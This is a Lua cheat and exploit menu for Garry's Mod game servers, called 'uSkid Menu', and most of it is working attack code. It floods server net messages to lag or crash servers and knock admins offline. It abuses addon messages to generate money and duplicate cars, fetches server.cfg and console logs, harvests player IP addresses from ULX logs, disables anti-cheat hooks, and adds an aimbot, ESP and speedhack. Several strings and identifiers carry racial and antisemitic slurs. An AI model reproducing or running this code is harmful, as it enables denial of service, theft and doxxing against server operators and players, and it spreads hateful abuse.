//////////////////////////////////
//   Main Menu By Unlimited.   //
//   Credits: StandDev, Jay   //
//   Regan                  //
///////////////////////////////
// Some Content Hidden For  //
// Security Reasons. Do    //
// Not Share It If You    //
// Find It.              //
//////////////////////////

/////////////////////
// .:uSkid Menu:. //
///////////////////

/////////////////
// 5.1 Update //
///////////////
//New Aimbot and ESP started, but NOT finished.

////////////////
// Variables //
//////////////
local uPLY = LocalPlayer() //Player.
local ply = LocalPlayer() //Player.
local uSkid = "5.1" //uSkid Version.

//////////////////////
// Request Counter //
////////////////////
uRequest= 1; //Default Request Counter.

///////////////////
// Required DLL //
/////////////////
//require("requestfile") //Only for IP Grabbing. Disable this if you dont have the DLL for it.

/////////////////////////////
// Chat & Console Command //
///////////////////////////
function send(message)
uRequest = uRequest + 1
chat.AddText(Color(0, 255, 0), "[uSkid]: ", Color(255,255,255), message)
end
function CPrint(message)
uRequest = uRequest + 1
MsgC(Color(0, 255, 0), "[uSkid]: ", Color(255,255,255), message, "\n")
end

///////////////////////////
// IP Grabbing Function //
/////////////////////////
local function GetIP(ply,txt)
if ply != LocalPlayer() then
return
end
if txt == "" then
return
end
local str = os.date( "data/ulx_logs" .. "/" .. "%m-%d-%y" .. ".txt" )
if file.Exists("download/" .. str, "GAME") then
send("Go to download/data/ulx_logs and delete the .txt")
return
end
RequestFile(str)
send("Grabbing IP..")
hook.Remove("Think", "420_LOGS_420")
hook.Add("Think", "420_LOGS_420", function()
if file.Exists("download/" .. str, "GAME") then
hook.Remove("Think", "420_LOGS_420")
local ips = file.Read("download/" .. str, "GAME")
ips = string.Explode( "\n", ips )
local ip_list = {}
for _,v in pairs(ips) do
if string.find(v, "spawned in server") then
local ip = string.Split(v, "(")[2]
if ip then
ip = string.Split(ip,")")[1]
if ip and tonumber(ip[1]) then
local str = string.Replace( v, "Client \"", "" )
str = string.Replace( str, "\" spawned in server (", " -> " )
str = string.Replace( str, ")<STEAM", " (STEAM" )
str = string.Replace( str, ">.", ")" )
table.insert(ip_list, str)
end
end
end
end
local name = string.lower(args[1])
local ip
for k,v in pairs(ip_list) do
if tostring (v) and string.find( string.lower(v), name ) then
ip = v                 
end
end
if tostring(ip) then
send("User IP: " ..ip)  
end
end
end)
end

///////////////////////
// Main Menu Script //
/////////////////////
concommand.Add("uSkid_menu", function( uPLY )
local uSkidMenu = DermaMenu() -- Is the same as vgui.Create( "DMenu" )
--Basic check for allowed access.

uSkidMenu:AddOption( "uSkid Menu " .. uSkid, function()
uPLY:ConCommand("uSkid_menu")
end):SetImage( "icon16/chart_curve.png" )

uSkidMenu:AddSpacer() //Line spacer to make the menu look a little bit neater.

///////////////////////////////////////////////////
// Checks To See If There Are Any Admins Online //
/////////////////////////////////////////////////
local Info = uSkidMenu:AddSubMenu( "General" )
Info:AddOption( "Check For Admins", function()
send("Checking Admin Status..")
for k,v in pairs(player.GetAll()) do
if v:IsAdmin() then
send("Admin: " .. v:Nick() .. " Connection: " .. v:SteamID())
end
end
end):SetImage( "icon16/shield_go.png" )

/////////////////////
// Console Prints //
///////////////////
Info:AddOption("Command Help", function()
send("Information Printed In Console.")
CPrint(".:uSkid Menu:.")
CPrint("")
CPrint("General Section")
CPrint("Check For Admins: Roots everyone checked for v:IsAdmin()")
CPrint("List All ID's: Prints all members online steamid")
CPrint("List All IPs: Prints all members connection IP Address")
CPrint("Spamming Section")
CPrint("Start Spamming ULX: Abuses the friends table in essentials addon")
CPrint("Stop Spamming ULX: Stops destructing the friends tables")
CPrint("Enable Name Stealing: Changes your name to someone elses to avoid punishment")
CPrint("Disable Name Stealing: Stops the hook to do the function above")
CPrint("Want Everyone On: Makes everyone online wanted for an invalid reason")
CPrint("Want Everyone Off: Stops wanting everyone online")
CPrint("Download Section")
CPrint("Request CFG: Downloads the server cfg folder to gmod/download")
CPrint("Request LOG: Downloads the console.log from the server")
CPrint("Exploits Section")
CPrint("Spawn Cannonball: Spawns the solid cannonball model that explodes on doors")
CPrint("Remove Prop: Removes a prop you're looking at providing the server has MDE")
CPrint("Money Exploit 1: Bails you out of prison and gives you money using the bailNPC")
CPrint("Car Dealer Money: Sells a car you're looking at using 3d car dealer")
CPrint("ATM Money: Adds money to your old darkrp ATM machine (rare to find)")
CPrint("Oven Button: Changes your button model to an oven to bypass anti prop kill")
CPrint("Fuck Sky Hoverball: Changes the hoverball model so when you spawn it the sky goes dark")
CPrint("Forcing Section")
CPrint("Allow SV Cheats: Forces the var sv_cheats so you can use it")
CPrint("Allow Client Lua: Already enabled if you're reading this")
CPrint("Minging Section")
CPrint("Speedhack On: Enables speedhack which makes you run very fast")
CPrint("Speedhack OfF: Diasbles speedhack so you run at default speed")
CPrint("Spoof Player Colors: Changes your physgun and player color to a random one upon death")
CPrint("Bypass aPac: Removes all the anti prop kill hooks if the server is using it")
CPrint("Fast Physgun: Changes your scrolling speed to 1000 instantly")
CPrint("Enable Laser Beam: Displays a red laser from the end of your weapon")
CPrint("Disable Laser Beam: Disables the feature above")
CPrint("ESP On: Shows where everyone is on the map using a wall hack feature")
CPrint("Esp Off: Removes the feature above")
CPrint("Aimbot On: Enables the auto aim which works when you hold E")
CPrint("Aimbot OfF: Removes the feature above")
CPrint("Massive Ropes: Changes your elastic, rope and winch width to 1000")
CPrint("Spawn Huge Prop: Spawns a huge 32x32 prop that can piss people off")
CPrint("")
CPrint("This is only supported for version 3.0. This wont be update from then on")
CPrint("")
CPrint("Thanks for using uSkid. Made by Joe <3")
end):SetImage("icon16/information.png")

////////////////////////////////
// List Everyone Onlines IDs //
//////////////////////////////
Info:AddOption( "List All IDs", function()
for k,v in pairs(player.GetAll()) do
if !v:IsAdmin() then
send("USER: " .. v:Nick() .. " - " .. v:SteamID())
end
end
end):SetImage( "icon16/book_previous.png" )

///////////////////////////////
// List Everyone Onlines IP //
/////////////////////////////
Info:AddOption( "List All IPs", function() 
send("Coming Soon.")
end):SetImage( "icon16/connect.png" )

///////////////////////////////////////////
// Starts Crashing ULX Essentials Table //
/////////////////////////////////////////
local Rcon = uSkidMenu:AddSubMenu( "Spamming" )
Rcon:AddOption( "Start Spamming ULX", function()
send("Started Spamming ULX.")
timer.Create("wreckulxf", 2, 0, function()
local friends = {}
table.insert( friends, math.random(1,9999) )
for i = 1,6000 do
net.Start("friendlist")
net.WriteTable(friends)
net.SendToServer()
end
send("Spamming Complete.")
end)
end ):SetImage( "icon16/script_error.png" )

//////////////////////////////////////////
// Stops Crashing ULX Essentials Table //
////////////////////////////////////////
Rcon:AddOption( "Stop Spamming ULX", function()
timer.Destroy("wreckulxf")
send("Stopped Spamming ULX.")
end):SetImage( "icon16/script.png" )

///////////////////////////////////////////
// Spawns 1000000 pockets to lag server //
/////////////////////////////////////////
Rcon:AddOption("Start Lagging Server", function()
send("Server Lag Starting")
timer.Create("uSkid_lag", 1, 0, function()				
for i=1,10000 do
net.Start("DarkRP_spawnPocket")
net.SendToServer()
end
end)
end):SetImage( "icon16/disconnect.png" )

/////////////////////////////
// Stops Spawning Pockets //
///////////////////////////
Rcon:AddOption("Stop Lagging Server", function()
send("Server Lag Stopped")
timer.Stop("uSkid_lag")
end):SetImage( "icon16/connect.png" )

///////////////////////////////////////
// Freeze Everyone Using Atlas Chat //
/////////////////////////////////////
Rcon:AddOption("Atlas Chat Freeze", function()
local enabled = false
chat.AddText = MsgC
timer.Create("freeze_all", 0.1, 0, function()
if !enabled then
return
end
net.Start("atlaschat.chat")
local str = "/ooc "
for i=1, 100 do
str = str .. "<avatar>"
end
net.WriteString(str)
net.WriteBit(0)
net.SendToServer()
end)
enabled = !enabled
end):SetImage( "icon16/user_comment.png" )

////////////////////////////
// Enables Name Changing //
//////////////////////////
Rcon:AddOption( "Enable Name Stealing", function()
send("Name Stealing On.")
timer.Create("givemename", 0.12, 0, function()
local uPLYlastname = uPLY:Nick()
for k,v in pairs(player.GetAll()) do
local ligger_type = math.random(1,2)
local ligger_type1 = math.random(1,2)
--status("Trying Name change to " .. v:Nick() .. " - " .. v:SteamID())
if ligger_type1 == ligger_type then
--status("Name Changing to " .. v:Nick() .. " - " .. v:SteamID())
if uPLYlastname == v:Nick() then
local ligger_type = math.random(1,2)
local ligger_type1 = math.random(1,2)
else
uPLY:ConCommand("darkrp name " .. v:Nick() .. math.random(1,10))
--status("Changed Name to " .. v:Nick() .. " - " .. v:SteamID())
end
local ligger_type = math.random(1,2)
local ligger_type1 = math.random(1,2)
end
end
end)
end ):SetImage( "icon16/book_addresses.png" )

/////////////////////////////
// Disables Name Changing //
///////////////////////////
Rcon:AddOption( "Disable Name Stealing", function()
send("Name Stealing Off.")
timer.Destroy("givemename")
end ):SetImage( "icon16/book.png" )

///////////////////////////////////
// Makes Everyone Online Wanted //
/////////////////////////////////
Rcon:AddOption( "Want Everyone On", function()
timer.Create("allwanted949", 0.2, 0, function(  )
for k,v in pairs(player.GetAll()) do
local ligger_type = math.random(1,13)
local ligger_type1 = math.random(1,13)
--send("Attempting Want on: " .. v:Nick() .. " - " .. v:SteamID())
if ligger_type1 == ligger_type then
if last_uPLY == v:Nick() then
local ligger_type = math.random(1,13)
local ligger_type1 = math.random(1,13)
else
uPLY:ConCommand("darkrp wanted " .. v:Nick() .. " " .. math.random(1,999))
end
local last_uPLY = v:Nick()
local ligger_type = math.random(1,13)
local ligger_type1 = math.random(1,13)
--send("Force Wanting: " .. v:Nick())
end
end
end)
end):SetImage( "icon16/script_add.png" )

////////////////////////////////////
// Stops Wanting Everyone Online //
//////////////////////////////////
Rcon:AddOption( "Want Everyone Off", function()
timer.Destroy("allwanted949")
send("Stopped Wanting Everyone.")
end):SetImage( "icon16/script_delete.png" )

//////////////////////////////////////////
// Downloads The Servers CFG Directory //
////////////////////////////////////////
local Dl = uSkidMenu:AddSubMenu( "Download" )
Dl:AddOption( "Server CFG", function()
send("Requesting Files.. Check Console.")
RunConsoleCommand("request_file", "cfg/server.cfg")
end):SetImage( "icon16/server_go.png" )

////////////////////////////////////////
// Downloads The Servers Console Log //
//////////////////////////////////////
Dl:AddOption( "Console LOG", function()
send("Console Log Downloaded.")
RunConsoleCommand("request_file", "./console.log")
end):SetImage( "icon16/application_xp_terminal.png" )

///////////////////////////////////////////////
// Spawns A Cannonball. Push It Into A Door //
/////////////////////////////////////////////
local Exploits = uSkidMenu:AddSubMenu( "Exploits" )
Exploits:AddOption( "Spawn Cannonball", function()

send("Cannonball Spawned.")
RunConsoleCommand("gm_spawn", "models/props_phx/cannonball_solid.mdl")
end):SetImage( "icon16/bomb.png" )

///////////////////
// AntiPK Extra //
/////////////////
concommand.Add("uSkid_bypasspk", function()
net.Recieve("sMsgStandard", function()
CPrint("Bypassed")
end)
net.Receive("sNotifyHit", function()
CPrint("Bypassed")
end)
net.Receive("sMsgAdmins", function()
CPrint("Bypassed")
end)
net.Receive("sAlertNotice", function()
CPrint("Bypassed")
end)
end)

//////////////////////
// Kick The Admins //
////////////////////
Exploits:AddOption("AE Kick Admins", function()
send("Kicking Admins..")
timer.Create( "aekickdaskids", 3, 0, function()
for k,v in ipairs(player.GetAll()) do 
if( v:GetUserGroup() != "user" ) then
if( v:GetUserGroup() != "vip" ) then
for i=0, 1000 do 
net.Start("uPLYWarning")
net.WriteEntity(v)
net.WriteString('You have to select a player before doing a action.')
net.SendToServer()
end
send("Flooding Client: " ..v:Nick())
end
end 
end
end)
end):SetImage( "icon16/disconnect.png" )

//////////////////////
// Kick The Admins //
////////////////////
function bootadmins()
send("Kicking Admins..")
timer.Create( "heymnangng", 3, 0, function()
for k,v in ipairs(player.GetAll()) do 
if( v:GetUserGroup() != "user" ) then
  if v:Nick() != "Unlimited" then
for i=0, 700 do 
net.Start( "GetCar" ) 
net.WriteEntity(v) 
net.WriteEntity(v) 
net.SendToServer() 
end
send("Flooding Client: " ..v:Nick())
end
end
end 
end)
end
concommand.Add( "uSkid_kickadmins", bootadmins)

//////////////////////
// Kick The Admins //
////////////////////
Exploits:AddOption("MX Kick Admins", function()
uPLY:ConCommand("uSkid_kickadmins")
end):SetImage( "icon16/disconnect.png" )

/////////////////////////////////
// Makes All Rope Widths 1000 //
///////////////////////////////
Exploits:AddOption( "Massive Ropes", function()
uPLY:ConCommand("rope_width 1000")
uPLY:ConCommand("elastic_width 1000")
uPLY:ConCommand("winch_rope_width 1000")
send("Rope, Winch And Elastic Set.")
end):SetImage( "icon16/rainbow.png" )

////////////////////////////////
// Spams Jailbreak Vote Kick //
//////////////////////////////
Exploits:AddOption("Jailbreak SpamVK", function()
send("Attempting Spam Kick, Keep Retrying.")
uPLY:ConCommand("uSkid_jbkickall")
end):SetImage( "icon16/book_go.png" )

//////////////////////////////////////
// Runs The Exploit For Car Dealer //
////////////////////////////////////
Exploits:AddOption( "Car Dealer Money", function()
uPLY:ConCommand("uSkid_cardealer")
end):SetImage( "icon16/car.png" )

//////////////////////////
// BailOut NPC Exploit //
////////////////////////
Exploits:AddOption( "BailOut NPC", function() 
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
send("Attempting Money Hack..")
for k,v in pairs(player.GetAll()) do
net.Start( "BailOut" )
net.WriteEntity( ply )
net.WriteEntity( ply )
net.WriteFloat( -2000000000 ) -- $2,000,000 Free cash.
net.SendToServer() 
end
end):SetImage( "icon16/money.png" )

//////////////////////
// HitmanX Exploit //
////////////////////
Exploits:AddOption("HitmanX NPC", function()
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
send("Attempting Money Hack..")
for k,v in pairs(player.GetAll()) do
net.Start( "SendMoney" )
net.WriteEntity( ply )
net.WriteEntity( ply )
net.WriteEntity( ply )
net.WriteString( "-2000000000" )
net.SendToServer()
end
end):SetImage( "icon16/money.png" )

//////////////////////////
// BailOut NPC Exploit //
////////////////////////
Exploits:AddOption( "BailOut NPC All", function() 
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
send("Attempting Money Hack..")
for k,v in pairs(player.GetAll()) do
net.Start( "BailOut" )
net.WriteEntity( v )
net.WriteEntity( v )
net.WriteFloat( -2000000000 ) -- $2,000,000 Free cash.
net.SendToServer() 
end
end):SetImage( "icon16/money.png" )

//////////////////////
// HitmanX Exploit //
////////////////////
Exploits:AddOption("HitmanX NPC All", function()
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
send("Attempting Money Hack..")
timer.Create("niggermoney", 1, 0, function()
for k,v in pairs(player.GetAll()) do
net.Start( "SendMoney" )
net.WriteEntity( v )
net.WriteEntity( v )
net.WriteEntity( v )
net.WriteString( -2000000000 )
net.SendToServer()
end
end)
end):SetImage( "icon16/money.png" )

Exploits:AddOption("Hitmenu Exploit", function()
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
send("Attempting Money Hack..")
net.Start("hitcomplete")
net.WriteDouble( 999999999999 )
net.SendToServer()
end):SetImage( "icon16/money.png" )

//////////////////////////////////
// Unarrests You From ByB Jail //
////////////////////////////////
Exploits:AddOption( "ByB Force Bail", function()
net.Start("Letthisdudeout")
net.WriteEntity(uPLY)
net.SendToServer()
end):SetImage( "icon16/lock_break.png" )

////////////////////
// Fucks The Sky //
//////////////////
Exploits:AddOption( "Lava Sky Hoverball", function()
send("Hoverball Fucked. Spawn one to ruin sky.")
--RunConsoleCommand("rope_material", "pp/bokehblur")
RunConsoleCommand("hoverball_model", "hoverball_model", "models/props_combine/portalskydome.mdl")
end):SetImage( "icon16/bug.png" )

///////////////////////
// Crash The Server //
/////////////////////
Exploits:AddOption("Attempt Server Crash", function()
for i=0, 20 do
net.Start( 'NET_SS_DoBuyTakeoff' )
net.WriteEntity(LocalPlayer())
net.WriteEntity(swag)
net.WriteTable({})
net.WriteInt(-1000000000000000000000000000000000000000000000000000000000000000000, 16)
net.SendToServer()
end
end):SetImage( "icon16/disconnect.png" )

///////////////////////
// Allows SV Cheats //
/////////////////////
local Vars = uSkidMenu:AddSubMenu( "Forcing" )
Vars:AddOption( "Allow SV Cheats", function()
uPLY:ConCommand("incrementvar sv_cheats 0 1 1")
end):SetImage( "icon16/chart_bar_add.png" )

////////////////////
// Allows CS Lua //
//////////////////
Vars:AddOption( "Allow Client Lua", function()

uPLY:ConCommand("incrementvar sv_cheats 0 1 1")
end):SetImage( "icon16/chart_bar_add.png" )

////////////////////////
// Enables SpeedHack //
//////////////////////
local Fun = uSkidMenu:AddSubMenu( "Minging" )
Fun:AddOption( "SpeedHack On", function()

uPLY:ConCommand("+uSkid_speedhack")
end):SetImage( "icon16/lightning_go.png" )

/////////////////////////
// Disables SpeedHack //
///////////////////////
Fun:AddOption( "SpeedHack Off", function()

uPLY:ConCommand("-uSkid_speedhack")
end):SetImage( "icon16/lightning_delete.png" )

//////////////////////////////////////
// Spoofs Player Colors Upon Death //
////////////////////////////////////
Fun:AddOption( "Spoof Player Colors", function()

timer.Create("spoofmeboi", 20, 0, function() 
uPLY:ConCommand("cl_weaponcolor 0." .. math.random(1,255) .. " 0." .. math.random(1,255) .. " 0." .. math.random(1,255))
uPLY:ConCommand("cl_playercolor 0." .. math.random(1,255) .. " 0." .. math.random(1,255) .. " 0." .. math.random(1,255))
send("Spoofed Physgun And Player Color.")
end)
end):SetImage( "icon16/palette.png" )

Fun:AddOption("Stop Spoofing Colors", function()
timer.Destroy("spoofmeboi")
send("Spoofing Disabled.")
end):SetImage( "icon16/cross.png" )

//////////////////////////////
// Enables Fast Wheelspeed //
////////////////////////////
Fun:AddOption( "Fast Physgun", function()
uPLY:ConCommand("physgun_wheelspeed 1000")
end):SetImage( "icon16/lightning.png" )

///////////////////////
// Enables Bunnyhop //
/////////////////////
Fun:AddOption("Enable BHop", function()
send("Bunny Hop Enabled.")

CreateClientConVar("uHop", 1, true, false)

function Bunnyhop()
	if GetConVar("uHop"):GetInt() == 1 then
	 	if input.IsKeyDown(KEY_SPACE) then
	 		if LocalPlayer():IsOnGround() then
	 			RunConsoleCommand("+jump")
	 			timer.Create("uHop", 0, 0.01, function()
	 		 	RunConsoleCommand("-jump")
	 		 	
	 		 	end)
	 		end
	 	end
	end
end

hook.Add("Think", "uHoppy", Bunnyhop )
local bhopoff
hook.Add("StartChat", "uSkidNigga", function()
	if GetConVarNumber("uHop") == 1 then
		RunConsoleCommand("uHop", 0)
		bhopoff = true
	else
		bhopoff = false
	end
end)

hook.Add("FinishChat", "bhpenabler", function()
	if bhopoff then
		RunConsoleCommand("uHop", 1)
		bhopoff = false
	end
end)

end):SetImage( "icon16/arrow_join.png" )

////////////////////////
// Disables Bunnyhop //
//////////////////////
Fun:AddOption("Disable BHop", function()

send("Bunny Hop Disabled.")
hook.Remove("Think", "Hoppy")
hook.Remove("FinishChat", "bhpenabler")
hook.Remove("StartChat", "Bhpdisbaker")
end):SetImage( "icon16/arrow_down.png" )

////////////////////////
// Enable Laser Beam //
//////////////////////
Fun:AddOption( "Enable Laser Beam", function()

local laser = Material( "sprites/bluelaser1" )
hook.Add("RenderScreenspaceEffects", "runlaser", function()
if shouldbeam then return end
local startpos = LocalPlayer():GetPos()
local EndPos = LocalPlayer():GetEyeTrace().HitPos;
local model = LocalPlayer():GetViewModel()
if not IsValid(model) then
return
end
local attach = model:GetAttachment("1")
if ( Attach == 0 ) then Attach = ViewModel:LookupAttachment("muzzle") end
if not attach then return end
startpos = attach.Pos
cam.Start3D()
render.SetMaterial( laser )
render.DrawBeam( startpos, EndPos, 5, 0, 0, Color( 255, 0, 0 ) )
render.SetMaterial(Material("Sprites/light_glow02_add_noz"))
render.DrawQuadEasy(LocalPlayer():GetEyeTrace().HitPos, (EyePos() -  LocalPlayer():GetEyeTrace().HitPos):GetNormal(), 30, 30, Color( 255, 0, 0 ))
cam.End3D()
end)
end):SetImage( "icon16/wand.png" )

//////////////////////////
// Disables Laser Beam //
////////////////////////
Fun:AddOption( "Disable Laser Beam", function()
hook.Remove("RenderScreenspaceEffects", "runlaser")
end):SetImage( "icon16/wand.png" )

/////////////////////////
// Enables Player ESP //
///////////////////////
Fun:AddOption( "Enable ESP", function()
send("ESP Enabled.")

/////////////
// 2D Box //
///////////
local rotation_vectors =
{
	Vector( 1, 	1,	1 ),
	Vector( -1, 1, 	1 ),
	Vector( 1, 	-1, 1 ),
	Vector( -1, -1, 1 )
}

hook.Add( "HUDPaint", "uSkidBox", function()
surface.SetDrawColor( color_white )
	
local w, h = ScrW(), ScrH()
	
for _, e in next, ents.GetAll() do
if not e:IsNPC() then continue end
		
local p = e:GetPos()
local a = e:GetAngles()
		
local mins = e:OBBMins()
local maxs = e:OBBMaxs()
		
local left, top 	= w, h
local right, bot	= 0, 0
		
for _, v in next, rotation_vectors do
local mins, maxs = mins, maxs
			
mins:Rotate( a )
maxs:Rotate( a )
			
local s_mins = ( p + mins * v ):ToScreen()
local s_maxs = ( p + maxs * v ):ToScreen()

left 	= math.min( left, math.min( s_mins.x, s_maxs.x ) )
top		= math.min( top, math.min( s_mins.y, s_maxs.y ) )
right 	= math.max( right, math.max( s_mins.x, s_maxs.x ) )
bot		= math.max( bot, math.max( s_mins.y, s_maxs.y ) )
end
surface.DrawOutlinedRect( left, top, right - left, bot - top )
end
end )

////////////////////////
// Name And Rank ESP //
//////////////////////


end):SetImage( "icon16/group_add.png" )

//////////////////////////
// Disables Player ESP //
////////////////////////
Fun:AddOption( "Disable ESP", function()
send("ESP Disabled.")
end):SetImage( "icon16/group_delete.png" )

////////////////////////
// Enable Entity ESP //
//////////////////////
local State = -1
Fun:AddOption("Enable Ent ESP", function()

State = State * -1
if State == 1 then
hook.Add("HUDPaint","printerfinder", function()
for k,Ent in pairs(ents.GetAll()) do 


if string.find(Ent:GetClass(),"printer") then
local PrinterPos = (Ent:GetPos()+Vector(0,0,20)):ToScreen()
draw.DrawText("Printer","Trebuchet18",PrinterPos.x,PrinterPos.y,Color(255,255,255),0,0,0,Color(255,255,255))
end

if string.find(Ent:GetClass(),"spawned_shipment") then	
local PrinterPos = (Ent:GetPos()+Vector(0,0,20)):ToScreen()
draw.DrawText("Shipment","Trebuchet18",PrinterPos.x,PrinterPos.y,Color(255,255,255),0,0,0,Color(255,255,255))
end

if string.find(Ent:GetClass(),"spawned_money") then	
local PrinterPos = (Ent:GetPos()+Vector(0,0,20)):ToScreen()
draw.DrawText("Money","Trebuchet18",PrinterPos.x,PrinterPos.y,Color(255,255,255),0,0,0,Color(255,255,255))
end

if string.find(Ent:GetClass(),"spawned_weapon") then	
local PrinterPos = (Ent:GetPos()+Vector(0,0,20)):ToScreen()
draw.DrawText("Weapon","Trebuchet18",PrinterPos.x,PrinterPos.y,Color(255,255,255),0,0,0,Color(255,255,255))
end

end
end)
end
end):SetImage( "icon16/magnifier_zoom_in.png" )

//////////////////////////
// Disables Entity ESP //
////////////////////////
Fun:AddOption("Disable Ent ESP", function()

hook.Remove("HUDPaint","printerfinder")
end):SetImage( "icon16/magifier_zoom_out.png" )

////////////////////
// Enable Aimbot //
//////////////////
Fun:AddOption( "Enable Aimbot", function()
send("Aimbot Enabled.")

CreateClientConVar("lenny_aimbot", 0, true, false)
CreateClientConVar("lenny_aimbotadv", 0, true, false)

local function aimbot()
	if GetConVarNumber("uBot") == 1 then
		local ply = LocalPlayer()
		local trace = util.GetPlayerTrace( ply )
		local traceres = util.TraceLine( trace )
		if traceres.HitNonWorld then
			local target = traceres.Entity
			if target:IsPlayer() or target:IsNPC() then
				local head = target:LookupBone("ValveBiped.Bip01_Head1")
				local headpos,headang = target:GetBonePosition(head)
				if LocalPlayer():KeyDown(IN_E) then
					ply:SetEyeAngles((headpos - ply:GetShootPos()):Angle())
				end
			end
		end
	end
end


local function aimbotadv()
	if GetConVarNumber("uBotADV") == 1 then
		function TableSortByDistance( former, latter )
			return latter:GetPos():Distance( LocalPlayer():GetPos() ) > former:GetPos():Distance( LocalPlayer():GetPos() ) 
		end
		playerss = {}
		function GetPlayersByDistance( )
		local players = player.GetAll()
		table.sort( players, TableSortByDistance )
		return players
		end

		if GetPlayersByDistance()[2]:Health() > 0 and GetPlayersByDistance()[2]:Alive() then
			local ply = LocalPlayer()
			local head = GetPlayersByDistance()[2]:LookupBone("ValveBiped.Bip01_Head1")
			local headpos,headang = GetPlayersByDistance()[2]:GetBonePosition(head)
			ply:SetEyeAngles((headpos - ply:GetShootPos()):Angle())
		end
		/*
		if (vdis <= 800) and vdis != 0 then
			local ply = LocalPlayer()
			local head = players[1]:LookupBone("ValveBiped.Bip01_Head1")
			local headpos,headang = players[1]:GetBonePosition(head)
			ply:SetEyeAngles((headpos - ply:GetShootPos()):Angle()) )
		end */
	end
end



hook.Add("Think", "Aimbotty", aimbot)
hook.Add("Think", "Aimbott2y", aimbotadv)

end):SetImage( "icon16/user_add.png" )

//////////////////////
// Disables Aimbot //
////////////////////
Fun:AddOption( "Disable Aimbot", function()
send("Aimbot Disabled.")
hook.Remove("CreateMove", "uSkidThinkIt")
end):SetImage( "icon16/user_delete.png" )

////////////////////
// Displays Menu //
//////////////////
uSkidMenu:Open()
uSkidMenu:Center()
CPrint("Menu Opened..")
LocalPlayer():EmitSound("common/warning.wav",500,100)
LocalPlayer():EmitSound("common/warning.wav",500,100)
LocalPlayer():EmitSound("common/warning.wav",500,100)
LocalPlayer():EmitSound("common/warning.wav",500,100)
LocalPlayer():EmitSound("common/warning.wav",500,100)
LocalPlayer():EmitSound("common/warning.wav",500,100)
end)

/////////////////////////
// Exploit Car Dealer //
///////////////////////
concommand.Add( "uSkid_cardealer", function( uPLY, cmd, args )

local ent = LocalPlayer():GetEyeTrace().Entity
if ( !IsValid( ent ) ) then
send("You must be looking at a car.")
return
end
for i = 0, 100 do
net.Start( "RXCAR_Shop_Store_C2S" )
net.WriteTable( { E = ent } )
net.SendToServer()
send("You car has been duped and stored.")
end
end)

/////////////////////////
// Exploit Car Dealer //
///////////////////////
concommand.Add( "uSkid_vcmod", function( uPLY, cmd, args )

local ent = LocalPlayer():GetEyeTrace().Entity
if ( !IsValid( ent ) ) then
send("You must be looking at a car.")
return
end
for i = 0, 100 do
net.Start( "AttemptSellCar" )
net.WriteTable( { E = ent } )
net.SendToServer()
send("Money Added.")
end
end)

////////////////////////////////
// Abuses Jailbreak Votekick //
//////////////////////////////
concommand.Add("uSkid_jbkickall",function()
for k,v in pairs(player.GetAll()) do
net.Start("JB_Votekick")
net.WriteEntity(v)
net.WriteString("JewMadBruh? JewMadBruh? JewMadBruh? JewMadBruh? JewMadBruh? JewMadBruh? JewMadBruh? JewMadBruh? JewMadBruh? JewMadBruh? JewMadBruh? JewMadBruh? JewMadBruh? JewMadBruh? JewMadBruh? JewMadBruh? JewMadBruh? ")
net.SendToServer()
end
end)

/////////////////
// IP Grabber //
///////////////
concommand.Add("uSkid_grabip", function(ply,cmd,args,str)
GetIP(ply,args[1])
end)

concommand.Add("+uSkid_speedhack", speedhack_on)
concommand.Add("-uSkid_speedhack", speedhack_off)

//////////////////////////
// SpeedHack Functions //
////////////////////////
function speedhack_on(  ) 
uPLY:ConCommand("+speed;_host_framerate 8;host_framerate 8")

send("Enabled SpeedHack")
end
function speedhack_off(  ) 
uPLY:ConCommand("-speed;_host_framerate 0;host_framerate 0")

send("Disabled SpeedHack")
end

////////////////////////////
// Fuck Off Lua Stealers //
//////////////////////////
function file.Read(d)
   return "Nice Fail. Thanks for trying to download uSkid. <3 Unlimited."
end

///////////////////
// QAC Bypasser //
/////////////////
timer.Destroy( "STC" )
hook.Remove("PlayerInitialSpawn", "AddPlayer")
hook.Remove("OnGamemodeLoaded", "___scan_g_init")
hook.Remove("PlayerSay", "screengrab_playersay")

//////////////////////////
// Main Script Opening //
////////////////////////
send("Welcome to uSkid. Running Version: " ..uSkid)
send("Ignore Script Errors When Loading.. Anti-Cheat Checker.")
CPrint("Developers: Unlim, StandDev, Jay #2ezy, Void, Regan")

/////////////////
// Water Mark //
///////////////
hook.Add("HUDPaint", "uSkidMark", function()
draw.DrawText("Current uSkid Version: " .. uSkid .. "", "BudgetLabel", 30, 30, Color(50, 150, 255, 255), TEXT_ALIGN_LEFT, TEXT_ALIGN_LEFT)
draw.DrawText("Total Requests Sent: " .. uRequest .. "", "BudgetLabel", 30, 45, Color(50, 150, 255, 255), TEXT_ALIGN_LEFT, TEXT_ALIGN_LEFT)
end)

////////////////////
// End Of Script //
//////////////////